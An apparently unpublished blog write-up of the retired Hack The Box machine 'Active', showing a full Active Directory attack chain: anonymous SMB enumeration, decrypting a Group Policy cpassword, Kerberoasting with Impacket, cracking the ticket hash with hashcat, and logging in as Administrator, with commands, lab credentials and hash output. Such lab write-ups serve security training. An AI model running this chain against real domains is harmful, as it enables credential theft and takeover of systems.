---
published: false
layout: post
author: Jake
date: '2018-12-10 00:00:01 UTC'
---
This week we take a look at the retired Hack The Box machine Active (low-medium difficulty)

Run our nmap scan:

```
root@kali: nmap -sC -sV -oN nmap 10.10.10.100
```

We get the results:
```
Scanned at 2018-11-12 20:18:46 AEDT for 189s
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2018-11-12 09:19:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
 
Host script results:
|_clock-skew: mean: 5s, deviation: 0s, median: 5s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 28249/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 54660/udp): CLEAN (Timeout)
|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2018-11-12 20:20:05
|_  start_date: 2018-11-12 17:38:46
```

We see a lot of things open, looking at all the open ports we are guessing that this box is an Active Directory Controller. One thing that sticks out is we have SMB. One of the tools in our Kali arsenal is `smbmap`. We use this tool to enumerate and see if we have anonymous access to any shares.

![221216770.png]({{site.baseurl}}/Images/221216770.png)

We can see that we have anonymous read only access to a share called `Replication`.

Connecting to the share and poking around for a bit until we find an interesting file
```
root@kali: smbclient \\\\10.10.10.100\\Replication -N                                                                                                                          130 ↵
WARNING: The "syslog" option is deprecated
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
Replication\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
The contents of this file are interesting, especially the `cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"` value.

Looking at the rest of the contents we can deduce that the name of the box is `active.htb` and we have a user called `SVC_TGS` with the password has above.

But we need to decrypt that password. Looking at the hash and the file that it was found in, we can determine that it is a Group Policy Password. Lucky for us we have a built in tool called `gpp-decrypt`
```
root@kali > gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
```
Nice!

So, now what we have is the log in credentials for a Service account, (SVC_).

Kerberoasting is the process of cracking a Kerberos Ticket and rebuilding them to gain access to a targeted service. This allows us to take control of services running as other users.. including NT AUTHORITY\SYSTEM

Because we have a service account we are able to attempt to grab some tickets and crack some passwords.

The Impacket suite or tools has everything we need to perform a Kerberoast attack.

Let's start by grabbing the hashes for any accounts that
```
root@kali: python GetUserSPNs.py -request -dc-ip 10.10.10.100 ACTIVE.htb/SVC_TGS
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 05:06:40  2018-07-31 03:17:40 

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$e9bf37a656b5a6b1db1165300c0f4a3d$82148a1574e0b9604e2a1e326a532257dd75f6cb114920b5af0780c4fab63a5eb88f6975e337c74b2ce3bea009915ec658680a0e31110fdcb9b9536f725ac424a0750deb5f1532ba57c846e82a358b6b66267b8cabadf2264e94afa7ba8725a033d03f4ae0751b3d5c5697a18df6fdfd6a2329247a069840be74187faa58fa26ab5bf6aa2b8d969860703c5b2793328c68a2d759cd2181c51315f42ea91bb0a146b7d653b83dace462fc3038515dce919f4acdbb2c1b850aa8721e348d83b61b428ceebe445e84ac07819ada745ac78c66facf82cd6a2114bb5bdf50f9f1193e8d88c1787f1421de0f19bb2df45d0c490cd7d7d748f8c25237c2871423444701d28eb51f1e7ae4a5e1fe54f7360faf9c04e6b5d8d91388b2f26fbe8805b4fd297cec475417dced7b1c6accf7d58a8c9fbf87020974d109597491dd350e77b856b0f8d34aac998f98f01a132b1e122a5e559121ac97bb5138b4d336b1051952434569fed1d0b83f6554ae03cf07f144c1240ef69b27551112da79de50d3d57b15e6d1a0c86264098d75e2d6b135af3a9d35d4ae75f501a852a5df0eb7acaec7bcb15baefd8decd321cbbe95feead91c74cc5016d514e27eedbc3f3bd03008032c34c72d99d7099603314fa0bf706deccf48e8cf1e51c0409034eca20539832f2ba1d9395d054446a3202c933404f6ab1162d7ad53092919c18f5cc31aec06db32f35f4e0ba127204fe934d36a06a4538d8d0e289778d213c06253d177bcab9b72643a55ef36c205fc2c5ef0c3311c6e828c7a424bceab61a69ce20017db78524290c77d9ae4495a38d7eb3f389ad48ba21267cc444cedb2ec59c1c01254d0a788b5cd6545f4bf3538ec27a2419b8944de7cb1e2679193fb2d416b0ca23232837643fbc4a78f99b71e1551186bb2dd0e3f2fc3d2090ae1a2cbf1efd585199a14456a2cfee11554743688a95f928f0dc2e9636a1ba57ed58058c9bdf95311903ebc0fdf2e65939558b4324d84052f21abc511a8f40b6479e5962fa2c2cea79cd081e3056231f896489379d35614c16cbd44b82b4cf93339ff8c66b4176a088d1352a91339c1ce53da87d53f218e8fc80638bce20f25da7efae205b394df14286264d85f9c185fdaa5b2262071ea85b9bd82310cc32b12bb18e5857e26cc39b3a816d562ac9f3046d968709a2ab4b88cfc76457283d409c220e6108da8d845119ced318997f56974ff4d3d9ec1bdbd61afa6d7210e3689d89557d6c2
```
Looks like the only account is Administrator! And we have the Kerberos hash for the account. Now it's time to try and crack it.

We used `HashCat` to make use of our GPUs, but `JohnTheRipper` should also work.
```
hashcat64.exe -m 13100 -a 0 active.txt rockyou.txt
```
and fairly quickly we get a result:

![215318567.png]({{site.baseurl}}/Images/215318567.png)

Now that we have the Administrators password we can connect back to SMB and read any file we want:
```
root@kali: smbclient \\\\10.10.10.100\\C$ -U administrator%Ticketmaster1968
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> dir
  $Recycle.Bin                      DHS        0  Tue Jul 14 12:34:39 2009
  Config.Msi                        DHS        0  Tue Jul 31 00:10:06 2018
  Documents and Settings            DHS        0  Tue Jul 14 15:06:44 2009
  pagefile.sys                      AHS 4294434816  Mon Nov 12 18:10:57 2018
  PerfLogs                            D        0  Tue Jul 14 13:20:08 2009
  Program Files                      DR        0  Thu Jul 19 04:44:51 2018
  Program Files (x86)                DR        0  Thu Jul 19 04:44:52 2018
  ProgramData                        DH        0  Mon Jul 30 23:49:31 2018
  Recovery                          DHS        0  Mon Jul 16 20:13:22 2018
  System Volume Information         DHS        0  Thu Jul 19 04:45:01 2018
  Users                              DR        0  Sun Jul 22 00:39:20 2018
  Windows                             D        0  Mon Jul 30 23:42:18 2018
smb: \> get Users\Administrator\Desktop\root.txt
smb: \> get Users\SVC_TGS\Desktop\user.txt
```